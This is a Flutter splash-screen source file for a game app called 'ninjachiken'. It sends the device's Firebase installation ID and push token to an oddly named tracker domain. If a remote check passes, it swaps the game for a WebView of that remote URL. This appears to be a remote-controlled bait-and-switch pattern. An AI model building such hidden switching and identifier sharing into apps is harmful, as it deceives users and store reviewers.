import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:ninjachiken/features/menu_screen/view/menu_screen.dart';
import 'package:ninjachiken/features/splash_screen/data/repositories/tracking_repository.dart';
import 'package:ninjachiken/features/splash_screen/view/web_view_screen.dart';
import 'package:ninjachiken/features/global/services/firebase_messaging_service.dart';
import 'package:ninjachiken/features/global/services/local_notifications_service.dart';
import 'package:ninjachiken/features/settings_screen/bloc/setting_bloc.dart';
import 'package:ninjachiken/features/settings_screen/bloc/settings_event.dart';
import 'package:firebase_app_installations/firebase_app_installations.dart';
import 'package:firebase_messaging/firebase_messaging.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  static const String trackerToken = "gsMyXrFC";
  static const String trackerBaseUrl = "https://dhgfgff.com/";

  final firebaseMessagingService = FirebaseMessagingService.instance();
  late final TrackingRepository _trackingRepository;

  @override
  void initState() {
    super.initState();

    _trackingRepository = TrackingRepository();

    // Запускаем инициализацию после первого кадра, чтобы UI успел построиться
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _startInitialization();
    });
  }

  Future<void> _startInitialization() async {
    try {
      // Шаг 1: Инициализируем музыку через SettingsBloc
      final settingsBloc = context.read<SettingsBloc>();
      settingsBloc.add(InitializeMusic());

      // Шаг 2: Отобразить сплэш, а пуши и трекинг грузить в фоне
      await _initPushNotifications();

      // Шаг 3: Выполнить трекинг только после инициализации пушей
      await _handleTracking();
    } catch (e, st) {
      debugPrint("Ошибка при инициализации: $e\n$st");
      _goToMenu();
    }
  }

  /// Безопасная инициализация FCM
  Future<void> _initPushNotifications() async {
    try {
      await firebaseMessagingService.init(
        localNotificationsService: LocalNotificationsService.instance(),
      );
    } catch (e) {
      debugPrint("Ошибка инициализации FCM: $e");
    }
  }

  /// Отправка данных трекинга
  Future<void> _handleTracking() async {
    final fullTrackerLink = "$trackerBaseUrl$trackerToken";

    bool isValid = false;
    try {
      isValid = await _trackingRepository.isTrackerLinkValid(fullTrackerLink);
    } catch (e) {
      debugPrint("Ошибка проверки трекера: $e");
    }

    if (!isValid) {
      _goToMenu();
      return;
    }

    final trackingData = await _collectTrackingData();
    final filledLink = _buildTrackingUrl(fullTrackerLink, trackingData);

    try {
      final hasSent = await _trackingRepository.hasSentData();
      if (!hasSent) {
        final success = await _trackingRepository.sendTrackingData(
          trackingData,
        );
        if (success) {
          await _trackingRepository.markDataSent();
        }
      }
    } catch (e) {
      debugPrint("Ошибка отправки трекинга: $e");
    }

    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => WebViewScreen(url: filledLink)),
    );
  }

  Future<Map<String, String>> _collectTrackingData() async {
    String installationId = "";
    String fcmToken = "";

    try {
      installationId = await FirebaseInstallations.instance.getId();
    } catch (e) {
      debugPrint("Ошибка получения installationId: $e");
    }

    try {
      fcmToken = await FirebaseMessaging.instance.getToken() ?? '';

      if (fcmToken.isNotEmpty) {
        await FirebaseMessaging.instance.subscribeToTopic('initial');
      }

      print('fcmToken: $fcmToken');
    } catch (e) {
      debugPrint("Ошибка получения FCM токена: $e");
    }

    return {
      "aid": installationId,
      "firebase_token": fcmToken,
      "app_name": "ninjachiken",
      "campaign": trackerToken,
    };
  }

  String _buildTrackingUrl(String baseUrl, Map<String, String> params) {
    final uri = Uri.parse(baseUrl).replace(
      queryParameters: {
        "aid": params["aid"] ?? '',
        "fcm": params["firebase_token"] ?? '',
        "app_name": "ninjachiken",
      },
    );

    return uri.toString();
  }

  void _goToMenu() {
    if (!mounted) return;
    Navigator.of(
      context,
    ).pushReplacement(MaterialPageRoute(builder: (_) => const MenuScreen()));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: double.infinity,
        height: double.infinity,
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage('assets/png/splash_bg.png'),
            fit: BoxFit.cover,
          ),
        ),
      ),
    );
  }
}
